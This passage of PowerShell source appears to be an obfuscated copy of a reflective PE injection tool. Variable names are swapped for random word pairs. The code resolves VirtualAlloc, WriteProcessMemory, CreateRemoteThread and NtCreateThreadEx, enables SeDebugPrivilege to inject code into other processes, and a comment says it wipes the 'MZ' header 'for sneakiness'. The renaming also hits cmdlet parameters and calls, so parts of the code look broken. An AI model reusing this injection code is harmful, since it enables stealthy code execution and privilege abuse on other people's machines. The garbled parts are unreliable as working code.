		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys PAGE_WRITECOPY -CampingArkite 0x08
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys PAGE_EXECUTE -CampingArkite 0x10
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys PAGE_EXECUTE_READ -CampingArkite 0x20
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys PAGE_EXECUTE_READWRITE -CampingArkite 0x40
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys PAGE_EXECUTE_WRITECOPY -CampingArkite 0x80
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys PAGE_NOCACHE -CampingArkite 0x200
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_REL_BASED_ABSOLUTE -CampingArkite 0
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_REL_BASED_HIGHLOW -CampingArkite 3
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_REL_BASED_DIR64 -CampingArkite 10
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_SCN_MEM_DISCARDABLE -CampingArkite 0x02000000
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_SCN_MEM_EXECUTE -CampingArkite 0x20000000
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_SCN_MEM_READ -CampingArkite 0x40000000
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_SCN_MEM_WRITE -CampingArkite 0x80000000
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_SCN_MEM_NOT_CACHED -CampingArkite 0x04000000
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys MEM_DECOMMIT -CampingArkite 0x4000
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_FILE_EXECUTABLE_IMAGE -CampingArkite 0x0002
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_FILE_DLL -CampingArkite 0x2000
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -CampingArkite 0x40
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_DLLCHARACTERISTICS_NX_COMPAT -CampingArkite 0x100
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys MEM_RELEASE -CampingArkite 0x8000
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys TOKEN_QUERY -CampingArkite 0x0008
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys TOKEN_ADJUST_PRIVILEGES -CampingArkite 0x0020
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys SE_PRIVILEGE_ENABLED -CampingArkite 0x2
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys ERROR_NO_TOKEN -CampingArkite 0x3f0
		
		return $FunksGoric
	}

	Function Get-CrinkleChapati
	{
		$CrinkleChapati = New-Object System.Object
		
		$DorminsBromley = Get-ByelawsFluters kernel32.dll VirtualAlloc
		$GinghamGlitnir = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$BudgieCunjer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DorminsBromley, $GinghamGlitnir)
		$CrinkleChapati | Add-Member NoteProperty -CrenelsBatboys VirtualAlloc -CampingArkite $BudgieCunjer
		
		$AngulaCurple = Get-ByelawsFluters kernel32.dll VirtualAllocEx
		$GibbetAcumens = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$CardecuCancri = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AngulaCurple, $GibbetAcumens)
		$CrinkleChapati | Add-Member NoteProperty -CrenelsBatboys VirtualAllocEx -CampingArkite $CardecuCancri
		
		$FodgeAmerced = Get-ByelawsFluters msvcrt.dll memcpy
		$AgnosyErrand = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$BachApplet = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FodgeAmerced, $AgnosyErrand)
		$CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys memcpy -CampingArkite $BachApplet
		
		$BroomyBegani = Get-ByelawsFluters msvcrt.dll memset
		$AbacusGlaikit = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$DotageArgyria = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($BroomyBegani, $AbacusGlaikit)
		$CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys memset -CampingArkite $DotageArgyria
		
		$EthnicCaruso = Get-ByelawsFluters kernel32.dll LoadLibraryA
		$ChetahEremic = Get-DelegateType @([String]) ([IntPtr])
		$CarrochBaals = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($EthnicCaruso, $ChetahEremic)
		$CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys LoadLibrary -CampingArkite $CarrochBaals
		
		$AcmesDisazo = Get-ByelawsFluters kernel32.dll GetProcAddress
		$CuppasBiffins = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GooferChimble = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AcmesDisazo, $CuppasBiffins)
		$CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys GetProcAddress -CampingArkite $GooferChimble
		
		$BeparseBarrios = Get-ByelawsFluters kernel32.dll GetProcAddress
		$FrumpsDivides = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$ChaptBibbons = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($BeparseBarrios, $FrumpsDivides)
		$CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys GetProcAddressOrdinal -CampingArkite $ChaptBibbons
		
		$CorinthBult = Get-ByelawsFluters kernel32.dll VirtualFree
		$FaienceDeem = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$BicornsFooldom = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CorinthBult, $FaienceDeem)
		$CrinkleChapati | Add-Member NoteProperty -CrenelsBatboys VirtualFree -CampingArkite $BicornsFooldom
		
		$CleamAdlay = Get-ByelawsFluters kernel32.dll VirtualFreeEx
		$CapfulDurance = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$GerimCanter = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CleamAdlay, $CapfulDurance)
		$CrinkleChapati | Add-Member NoteProperty -CrenelsBatboys VirtualFreeEx -CampingArkite $GerimCanter
		
		$AgoniseEmotes = Get-ByelawsFluters kernel32.dll VirtualProtect
		$BiogenyApart = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$CrasesAverts = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AgoniseEmotes, $BiogenyApart)
		$CrinkleChapati | Add-Member NoteProperty -CrenelsBatboys VirtualProtect -CampingArkite $CrasesAverts
		
		$AnodizeGeechee = Get-ByelawsFluters kernel32.dll GetModuleHandleA
		$AreitoCentrex = Get-DelegateType @([String]) ([IntPtr])
		$DepohGunkier = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AnodizeGeechee, $AreitoCentrex)
		$CrinkleChapati | Add-Member NoteProperty -CrenelsBatboys GetModuleHandle -CampingArkite $DepohGunkier
		
		$AlichelBrucina = Get-ByelawsFluters kernel32.dll FreeLibrary
		$FellahBoolian = Get-DelegateType @([Bool]) ([IntPtr])
		$CongaedEagles = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AlichelBrucina, $FellahBoolian)
		$CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys FreeLibrary -CampingArkite $CongaedEagles
		
		$BirkConusor = Get-ByelawsFluters kernel32.dll OpenProcess
	    $GlamourAglycon = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $AlcoAport = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($BirkConusor, $GlamourAglycon)
		$CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys OpenProcess -CampingArkite $AlcoAport
		
		$ChiasmBaas = Get-ByelawsFluters kernel32.dll WaitForSingleObject
	    $DuranceChabuk = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $CokyArenoid = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ChiasmBaas, $DuranceChabuk)
		$CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys WaitForSingleObject -CampingArkite $CokyArenoid
		
		$DolabraBudh = Get-ByelawsFluters kernel32.dll WriteProcessMemory
        $DovenedCurves = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $BindlesDobby = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DolabraBudh, $DovenedCurves)
		$CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys WriteProcessMemory -CampingArkite $BindlesDobby
		
		$ReadProcessMemoryAddr = Get-ByelawsFluters kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys ReadProcessMemory -CampingArkite $ReadProcessMemory
		
		$AmreetaFizzer = Get-ByelawsFluters kernel32.dll CreateRemoteThread
        $GinsCattier = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $DingeBolivar = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AmreetaFizzer, $GinsCattier)
		$CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys CreateRemoteThread -CampingArkite $DingeBolivar
		
		$ActiniaBudging = Get-ByelawsFluters kernel32.dll GetExitCodeThread
        $DingierBatmen = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $AwakedAuloi = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ActiniaBudging, $DingierBatmen)
		$CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys GetExitCodeThread -CampingArkite $AwakedAuloi
		
		$CelomsDarii = Get-ByelawsFluters Advapi32.dll OpenThreadToken
        $GranaryCrag = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $DunstExpense = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CelomsDarii, $GranaryCrag)
		$CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys OpenThreadToken -CampingArkite $DunstExpense
		
		$FiefBegrett = Get-ByelawsFluters kernel32.dll GetCurrentThread
        $DopedBroun = Get-DelegateType @() ([IntPtr])
        $GreetsCermet = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FiefBegrett, $DopedBroun)
		$CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys GetCurrentThread -CampingArkite $GreetsCermet
		
		$AthrobFatsoes = Get-ByelawsFluters Advapi32.dll AdjustTokenPrivileges
        $CloacalBrocard = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $GroovesCuba = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AthrobFatsoes, $CloacalBrocard)
		$CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys AdjustTokenPrivileges -CampingArkite $GroovesCuba
		
		$ClearedGuzul = Get-ByelawsFluters Advapi32.dll LookupPrivilegeValueA
        $CertainElbower = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $FrenchyAitesis = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ClearedGuzul, $CertainElbower)
		$CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys LookupPrivilegeValue -CampingArkite $FrenchyAitesis
		
		$ElihuFens = Get-ByelawsFluters Advapi32.dll ImpersonateSelf
        $CurdierGiarre = Get-DelegateType @([Int32]) ([Bool])
        $BluesyBombed = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ElihuFens, $CurdierGiarre)
		$CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys ImpersonateSelf -CampingArkite $BluesyBombed
		
        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $EcrusCalices = Get-ByelawsFluters NtDll.dll NtCreateThreadEx
            $CuspsDiadem = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $DamsonCrone = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($EcrusCalices, $CuspsDiadem)
		    $CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys NtCreateThreadEx -CampingArkite $DamsonCrone
        }
		
		$ChapesDoddle = Get-ByelawsFluters Kernel32.dll IsWow64Process
        $DenizenBodings = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $CurieFragile = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ChapesDoddle, $DenizenBodings)
		$CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys IsWow64Process -CampingArkite $CurieFragile
		
		$HafniumCithren = Get-ByelawsFluters Kernel32.dll CreateThread
        $AmphoreCeltuce = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $AbrusClite = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($HafniumCithren, $AmphoreCeltuce)
		$CrinkleChapati | Add-Member -MemberType NoteProperty -CrenelsBatboys CreateThread -CampingArkite $AbrusClite
	
		$GoodeFipenny = Get-ByelawsFluters kernel32.dll VirtualFree
		$GorbetDorset = Get-DelegateType @([IntPtr])
		$EdemaForked = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GoodeFipenny, $GorbetDorset)
		$CrinkleChapati | Add-Member NoteProperty -CrenelsBatboys LocalFree -CampingArkite $EdemaForked

		return $CrinkleChapati
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$FarleuChufa,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$GagedBarege
		)
		
		[Byte[]]$GrungesAcerose = [BitConverter]::GetBytes($FarleuChufa)
		[Byte[]]$GabbrosFopling = [BitConverter]::GetBytes($GagedBarege)
		[Byte[]]$BedmanCringe = [BitConverter]::GetBytes([UInt64]0)

		if ($GrungesAcerose.Count -eq $GabbrosFopling.Count)
		{
			$ErgatesDanio = 0
			for ($BopeepsGuessed = 0; $BopeepsGuessed -lt $GrungesAcerose.Count; $BopeepsGuessed++)
			{
				$FounderFreon = $GrungesAcerose[$BopeepsGuessed] - $ErgatesDanio
				#Sub bytes
				if ($FounderFreon -lt $GabbrosFopling[$BopeepsGuessed])
				{
					$FounderFreon += 256
					$ErgatesDanio = 1
				}
				else
				{
					$ErgatesDanio = 0
				}
				
				
				[UInt16]$AthymicAnklet = $FounderFreon - $GabbrosFopling[$BopeepsGuessed]

				$BedmanCringe[$BopeepsGuessed] = $AthymicAnklet -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($BedmanCringe, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$FarleuChufa,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$GagedBarege
		)
		
		[Byte[]]$GrungesAcerose = [BitConverter]::GetBytes($FarleuChufa)
		[Byte[]]$GabbrosFopling = [BitConverter]::GetBytes($GagedBarege)
		[Byte[]]$BedmanCringe = [BitConverter]::GetBytes([UInt64]0)

		if ($GrungesAcerose.Count -eq $GabbrosFopling.Count)
		{
			$ErgatesDanio = 0
			for ($BopeepsGuessed = 0; $BopeepsGuessed -lt $GrungesAcerose.Count; $BopeepsGuessed++)
			{
				#Add bytes
				[UInt16]$AthymicAnklet = $GrungesAcerose[$BopeepsGuessed] + $GabbrosFopling[$BopeepsGuessed] + $ErgatesDanio

				$BedmanCringe[$BopeepsGuessed] = $AthymicAnklet -band 0x00FF
				
				if (($AthymicAnklet -band 0xFF00) -eq 0x100)
				{
					$ErgatesDanio = 1
				}
				else
				{
					$ErgatesDanio = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($BedmanCringe, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$FarleuChufa,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$GagedBarege
		)
		
		[Byte[]]$GrungesAcerose = [BitConverter]::GetBytes($FarleuChufa)
		[Byte[]]$GabbrosFopling = [BitConverter]::GetBytes($GagedBarege)

		if ($GrungesAcerose.Count -eq $GabbrosFopling.Count)
		{
			for ($BopeepsGuessed = $GrungesAcerose.Count-1; $BopeepsGuessed -ge 0; $BopeepsGuessed--)
			{
				if ($GrungesAcerose[$BopeepsGuessed] -gt $GabbrosFopling[$BopeepsGuessed])
				{
					return $true
				}
				elseif ($GrungesAcerose[$BopeepsGuessed] -lt $GabbrosFopling[$BopeepsGuessed])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$CampingArkite
		)
		
		[Byte[]]$DemetonAnounou = [BitConverter]::GetBytes($CampingArkite)
		return ([BitConverter]::ToInt64($DemetonAnounou, 0))
	}
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$GaumishFrabbit,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$AmazuluGasking,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$GloriaDivel,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$CotwistChoses
		)
		
	    [IntPtr]$AgamidComid = [IntPtr](Add-SignedIntAsUnsigned ($GloriaDivel) ($CotwistChoses))
		
		$CowplopDatisi = $AmazuluGasking.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($AmazuluGasking.PEHandle) ($GloriaDivel)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $GaumishFrabbit"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($AgamidComid) ($CowplopDatisi)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $GaumishFrabbit"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$BuffyGarbage,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$FinchedAronia
		)
	
		for ($AlmostGhazal = 0; $AlmostGhazal -lt $BuffyGarbage.Length; $AlmostGhazal++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($FinchedAronia, $AlmostGhazal, $BuffyGarbage[$AlmostGhazal])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $BurttBrown = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $HailDolly = [Void]
	    )

	    $DaffishGolder = [AppDomain]::CurrentDomain
	    $DicksonCommune = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $CarmenGawping = $DaffishGolder.DefineDynamicAssembly($DicksonCommune, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $AmuseCagy = $CarmenGawping.DefineDynamicModule('InMemoryModule', $false)
	    $CaulsCaelum = $AmuseCagy.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $FurlingBallant = $CaulsCaelum.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $BurttBrown)
	    $FurlingBallant.SetImplementationFlags('Runtime, Managed')
	    $DoingsArkoses = $CaulsCaelum.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $HailDolly, $BurttBrown)
	    $DoingsArkoses.SetImplementationFlags('Runtime, Managed')
	    
	    Write-BespitGonial $CaulsCaelum.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ByelawsFluters
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $ExpanseBagman,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $BerainArachin
	    )

	    # Get a reference to System.dll in the GAC
	    $GiliaEery = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $BeefishFencing = $GiliaEery.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $DepohGunkier = $BeefishFencing.GetMethod('GetModuleHandle')
	    # Fix for "Ambiguous match found" for Win 10 1803 taken from Empire
        $GooferChimble = $BeefishFencing.GetMethod('GetProcAddress',[Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
	    # Get a handle to the module specified
	    $DummiesHansas = $DepohGunkier.Invoke($null, @($ExpanseBagman))
	    $BesteadCurring = New-Object IntPtr
	    $DowlEmender = New-Object System.Runtime.InteropServices.HandleRef($BesteadCurring, $DummiesHansas)

	    # Return the address of the function
	    Write-BespitGonial $GooferChimble.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$DowlEmender, $BerainArachin))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$CrinkleChapati,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$BetteBryce,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$FunksGoric
		)
		
		[IntPtr]$FineishElegy = $CrinkleChapati.GetCurrentThread.Invoke()
		if ($FineishElegy -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$BastingDent = [IntPtr]::Zero
		[Bool]$CoelomFlukily = $CrinkleChapati.OpenThreadToken.Invoke($FineishElegy, $FunksGoric.TOKEN_QUERY -bor $FunksGoric.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$BastingDent)
		if ($CoelomFlukily -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $FunksGoric.ERROR_NO_TOKEN)
			{
				$CoelomFlukily = $CrinkleChapati.ImpersonateSelf.Invoke(3)
				if ($CoelomFlukily -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$CoelomFlukily = $CrinkleChapati.OpenThreadToken.Invoke($FineishElegy, $FunksGoric.TOKEN_QUERY -bor $FunksGoric.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$BastingDent)
				if ($CoelomFlukily -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$HallahsDandy = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$BetteBryce.LUID))
		$CoelomFlukily = $CrinkleChapati.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $HallahsDandy)
		if ($CoelomFlukily -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$ByousCotonam = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$BetteBryce.TOKEN_PRIVILEGES)
		[IntPtr]$CeredAplysia = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ByousCotonam)
		$FirepanArboral = [System.Runtime.InteropServices.Marshal]::PtrToStructure($CeredAplysia, [Type]$BetteBryce.TOKEN_PRIVILEGES)
		$FirepanArboral.PrivilegeCount = 1
		$FirepanArboral.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($HallahsDandy, [Type]$BetteBryce.LUID)
		$FirepanArboral.Privileges.Attributes = $FunksGoric.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($FirepanArboral, $CeredAplysia, $true)

		$CoelomFlukily = $CrinkleChapati.AdjustTokenPrivileges.Invoke($BastingDent, $false, $CeredAplysia, $ByousCotonam, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($CoelomFlukily -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $CoelomFlukily, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($CeredAplysia)
	}
	
	
	Function Invoke-DingeBolivar
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$AmorousEscars,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$GloriaDivel,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$CrinkleChapati
		)
		
		[IntPtr]$AlkenylGlires = [IntPtr]::Zero
		
		$BriersEpopt = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($BriersEpopt -ge (New-Object 'Version' 6,0)) -and ($BriersEpopt -lt (New-Object 'Version' 6,2)))
		{
			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $GloriaDivel"
			$EkahaDolma= $CrinkleChapati.NtCreateThreadEx.Invoke([Ref]$AlkenylGlires, 0x1FFFFF, [IntPtr]::Zero, $AmorousEscars, $GloriaDivel, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$BattikCadua = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($AlkenylGlires -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $EkahaDolma. LastError: $BattikCadua"
			}
		}
		#XP/Win8
		else
		{
			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $GloriaDivel"
			$AlkenylGlires = $CrinkleChapati.CreateRemoteThread.Invoke($AmorousEscars, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $GloriaDivel, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($AlkenylGlires -eq [IntPtr]::Zero)
		{
			Write-Verbose "Error creating remote thread, thread handle is null"
		}
		
		return $AlkenylGlires
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$BlinDefoam,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$BetteBryce
		)
		
		$CrosierFelt = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$GrigsBlately = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BlinDefoam, [Type]$BetteBryce.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$DiffersAbactor = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BlinDefoam) ([Int64][UInt64]$GrigsBlately.e_lfanew))
		$CrosierFelt | Add-Member -MemberType NoteProperty -CrenelsBatboys NtHeadersPtr -CampingArkite $DiffersAbactor
		$AndhraDogtie = [System.Runtime.InteropServices.Marshal]::PtrToStructure($DiffersAbactor, [Type]$BetteBryce.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($AndhraDogtie.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($AndhraDogtie.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
